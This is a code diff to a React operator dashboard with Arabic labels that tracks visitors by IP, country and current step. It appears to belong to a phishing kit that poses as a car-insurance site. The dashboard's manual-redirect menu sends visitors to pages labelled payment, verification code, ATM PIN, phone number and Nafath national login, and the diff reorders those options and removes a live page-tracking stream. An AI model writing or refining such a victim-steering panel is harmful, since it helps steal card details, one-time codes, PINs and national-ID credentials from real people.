@@ -67,30 +67,6 @@ function formatRelativeTimeLabel(isoString?: string): string {
   return age.label;
 }
 
-// Page name translations to Arabic
-const PAGE_NAMES_ARABIC: Record<string, string> = {
-  "home-new": "الرئيسية",
-  "home": "الرئيسية",
-  "insur": "بيانات المركبة",
-  "vehicle": "بيانات المركبة",
-  "compar": "اختيار التأمين",
-  "compare": "اختيار التأمين",
-  "check": "الدفع",
-  "payment": "الدفع",
-  "step2": "رمز التحقق",
-  "otp": "رمز التحقق",
-  "step3": "رمز ATM",
-  "atm": "رمز ATM",
-  "step4": "النفاذ الوطني",
-  "nafad": "النفاذ الوطني",
-  "step5": "رقم الهاتف",
-  "phone": "رقم الهاتف",
-  "thank-you": "شكراً",
-  "confi": "تأكيد",
-  "veri": "تحقق",
-  "unknown": "غير معروف"
-};
-
 // Live timer component for each request
 function LiveTimer({ startTime }: { startTime: string }) {
   const [elapsed, setElapsed] = useState(formatElapsedTime(startTime));
@@ -103,11 +79,6 @@ function LiveTimer({ startTime }: { startTime: string }) {
   }, [startTime]);
   
   return <span style={{ fontFamily: "monospace", fontSize: "0.85rem" }}>{elapsed}</span>;
-}
-
-// Helper function to get Arabic page name
-function getPageNameArabic(page: string): string {
-  return PAGE_NAMES_ARABIC[page] || page;
 }
 
 export default function DashboardPage() {
@@ -126,21 +97,18 @@ export default function DashboardPage() {
   const socketRef = useRef<Socket | null>(null);
   const currentTimeRef = useRef(Date.now());
   const headerMenuRef = useRef<HTMLDivElement | null>(null);
-  const sseRef = useRef<EventSource | null>(null);
-  const [livePageUpdates, setLivePageUpdates] = useState<Record<string, { currentPage: string; pageNameArabic: string; timestamp: string }>>({});
 
-  // Page options for manual redirect (with Arabic names)
+  // Page options for manual redirect
   const pageOptions = [
     { value: "", label: "اختر صفحة للتوجيه..." },
     { value: "home-new", label: "🏠 الرئيسية" },
-    { value: "insur", label: "🚗 بيانات المركبة" },
-    { value: "compar", label: "📋 اختيار التأمين" },
-    { value: "check", label: "💳 الدفع" },
+    { value: "step1", label: "📋 اختيار التأمين" },
     { value: "step2", label: "🔐 رمز التحقق" },
     { value: "step3", label: "🔢 رمز ATM" },
+    { value: "step4", label: "💳 الدفع" },
     { value: "step5", label: "📱 رقم الهاتف" },
-    { value: "step4", label: "🔒 النفاذ الوطني" },
-    { value: "nafad", label: "🔑 النفاذ" },
+    { value: "step6", label: "🔒 النفاذ" },
+    { value: "nafad-otp", label: "🔑 رمز النفاذ" },
   ];
 
   // Stats derived from the real visitor data stream
@@ -303,56 +271,6 @@ export default function DashboardPage() {
       socketRef.current = null;
     };
   }, [handleSocketUpdate]);
-
-  // SSE connection for real-time page updates
-  useEffect(() => {
-    if (!selectedRequest?.visitorId) return;
-    
-    const visitorId = selectedRequest.visitorId;
-    const sseUrl = `${DASHBOARD_BACKEND_URL}/api/visitors/${visitorId}/stream`;
-    
-    // Close existing connection
-    if (sseRef.current) {
-      sseRef.current.close();
-    }
-    
-    const eventSource = new EventSource(sseUrl);
-    sseRef.current = eventSource;
-    
-    eventSource.addEventListener("pageChange", (event) => {
-      try {
-        const data = JSON.parse(event.data);
-        if (data.visitorId === visitorId) {
-          // Inline page name translation to avoid closure issues
-          const pageName = data.pageNameArabic || PAGE_NAMES_ARABIC[data.currentPage] || data.currentPage;
-          setLivePageUpdates((prev) => ({
-            ...prev,
-            [visitorId]: {
-              currentPage: data.currentPage,
-              pageNameArabic: pageName,
-              timestamp: data.timestamp
-            }
-          }));
-        }
-      } catch (e) {
-        console.error("[Dashboard] SSE parse error:", e);
-      }
-    });
-    
-    eventSource.addEventListener("connected", (event) => {
-      console.log("[Dashboard] SSE connected:", event);
-    });
-    
-    eventSource.onerror = () => {
-      console.log("[Dashboard] SSE error, will retry...");
-      eventSource.close();
-    };
-    
-    return () => {
-      eventSource.close();
-      sseRef.current = null;
-    };
-  }, [selectedRequest?.visitorId]);
 
   // Update current time every second for timers
   useEffect(() => {
@@ -615,12 +533,7 @@ export default function DashboardPage() {
     const country = getRealFieldValue(raw, ["country", "countryCode", "countryName"], "غير معروف");
     const ip = getRealFieldValue(raw, ["ip", "clientIp", "visitorIp"], "—");
     const currentPage = getRealFieldValue(raw, ["currentPage", "page"], typeof raw.currentPage === 'string' ? raw.currentPage : (typeof raw.page === 'string' ? raw.page : "غير معروف"));
-    const pageNameArabic = getPageNameArabic(currentPage);
     const currentStep = getRealFieldValue(raw, ["currentStep", "step"], "—");
-
-    // Check for live page update from SSE
-    const visitorId = selectedRequest?.visitorId;
-    const liveUpdate = visitorId ? livePageUpdates[visitorId] : null;
 
     return {
       ownerName,
@@ -633,10 +546,9 @@ export default function DashboardPage() {
       country,
       ip,
       currentPage,
-      pageNameArabic: liveUpdate?.pageNameArabic || pageNameArabic,
       currentStep,
     };
-  }, [selectedRequest, livePageUpdates]);
+  }, [selectedRequest]);
 
   // Show notification
   const showNotification = (type: "success" | "error", message: string) => {
@@ -2041,7 +1953,7 @@ const renderNafadBox = () => {
                       </div>
                       <div style={{ display: "flex", alignItems: "center", gap: 6, flexWrap: "wrap" }}>
                         <span style={{ fontSize: "0.75rem", color: "#4b5563", fontWeight: 600 }}>
-                          {getPageNameArabic(currentPage)}
+                          {currentPage}
                         </span>
                         <span style={{
                           width: 6,
@@ -2175,7 +2087,7 @@ const renderNafadBox = () => {
                   </div>
                   <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", flexShrink: 0 }}>
                     <span style={{ fontSize: "10px", padding: "2px 6px", background: "#dcfce7", color: "#166534", borderRadius: 4, border: "1px solid #86efac", fontWeight: 600 }}>
-                      {liveSummary.pageNameArabic}
+                      {liveSummary.currentPage}
                     </span>
                   </div>
                 </div>
